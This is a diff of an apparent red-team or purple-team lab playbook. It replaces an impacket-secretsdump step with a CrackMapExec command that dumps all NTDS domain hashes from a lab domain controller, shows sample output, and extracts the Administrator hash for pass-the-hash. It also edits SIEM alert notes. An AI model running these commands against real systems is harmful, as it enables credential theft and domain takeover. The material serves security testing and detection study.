@@ -905,43 +905,38 @@ SMB  192.168.10.10  445  DC01  [+] novatech.local\svc_backup:Backup_Svc99!
 
 ```bash
 [KALI]
-# Dump all domain hashes via VSS/Backup Operators path
-# -use-vss: use Volume Shadow Copy Service to access NTDS.dit (bypasses locks)
-# -just-dc-ntlm: only output NT hashes (skip Kerberos keys — faster, cleaner)
-# -output: base filename for output files
-impacket-secretsdump \
-  novatech.local/svc_backup:'Backup_Svc99!'@192.168.10.10 \
-  -use-vss \
-  -just-dc-ntlm \
-  -output /opt/loot/ntds_dump
+# Dump all domain hashes via CrackMapExec (handles VSS internally)
+# --ntds: dump NTDS.dit via VSS shadow copy
+# CME saves output to ~/.cme/logs/<hostname>_<ip>_<date>.ntds
+crackmapexec smb 192.168.10.10 \
+  -u svc_backup \
+  -p 'Backup_Svc99!' \
+  --ntds
 ```
 
 **Expected output:**
 ```
-[*] Service RemoteRegistry is in stopped state
-[*] Starting service RemoteRegistry
-[*] Creating a VSS snapshot on [DC01]
-[*] Extracting ntds.dit from VSS snapshot
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-novatech.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM>:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM>:::
-novatech.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:<JSMITH_NTLM>:::
-novatech.local\svc_ldap:1104:aad3b435b51404eeaad3b435b51404ee:<SVCLDAP_NTLM>:::
-novatech.local\svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:<SVCBACKUP_NTLM>:::
-[*] Stopping service RemoteRegistry
+SMB  192.168.10.10  445  DC01  [+] novatech.local\svc_backup:Backup_Svc99! (Pwn3d!)
+SMB  192.168.10.10  445  DC01  [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB  192.168.10.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM>:::
+SMB  192.168.10.10  445  DC01  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB  192.168.10.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM>:::
+SMB  192.168.10.10  445  DC01  novatech.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:<JSMITH_NTLM>:::
+SMB  192.168.10.10  445  DC01  novatech.local\svc_ldap:1104:aad3b435b51404eeaad3b435b51404ee:<SVCLDAP_NTLM>:::
+SMB  192.168.10.10  445  DC01  novatech.local\svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:<SVCBACKUP_NTLM>:::
+SMB  192.168.10.10  445  DC01  [+] NTDS.dit dumped successfully
 ```
 
 ```bash
 [KALI]
-# Save the Administrator NTLM for Pass-the-Hash in Phase 5
-cat /opt/loot/ntds_dump.ntds | grep "Administrator:"
-# Extract the NT hash (field 4 of colon-delimited output)
+# CME saves to ~/.cme/logs/ — copy to loot directory
+cp $(ls -t ~/.cme/logs/*.ntds 2>/dev/null | head -1) /opt/loot/ntds_dump.ntds
+
+# Extract Administrator NTLM (field 4, colon-delimited)
 ADMIN_NTLM=$(grep "^Administrator:" /opt/loot/ntds_dump.ntds | cut -d: -f4)
 echo "Administrator NTLM: ${ADMIN_NTLM}"
 
-# Save for later phases
+# Save for Pass-the-Hash in Phase 5
 echo "${ADMIN_NTLM}" > /opt/loot/admin_ntlm.txt
 ```
 
@@ -950,7 +945,6 @@ Tickets valid for any service in the domain — persistent access that survives 
 all other accounts (only invalidated by double-rotating krbtgt).
 
 **SIEM alert fired:**
-- Windows EID 7036: RemoteRegistry service started — **MEDIUM**
 - VSS creation events on DC01 — **HIGH**
 
 ### 4.3 LSASS Dump on WS01 (Credential Demonstration)
